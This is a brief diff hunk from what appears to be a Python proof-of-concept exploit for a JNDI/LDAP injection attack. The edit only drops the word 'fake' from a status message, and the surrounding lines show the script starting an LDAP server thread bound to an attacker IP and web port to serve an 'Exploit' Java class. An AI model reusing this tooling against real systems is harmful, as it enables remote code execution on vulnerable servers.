@@ -74,7 +74,7 @@ public class Exploit {
     print(Fore.RED + f'[-] Something went wrong {e.toString()}')
 
   checkJavaAvailible()
-  print(Fore.GREEN + '[+] Setting up fake LDAP server\n')
+  print(Fore.GREEN + '[+] Setting up LDAP server\n')
 
   # create the LDAP server on new thread
   t1 = threading.Thread(target=createLdapServer, args=(userip,webport))
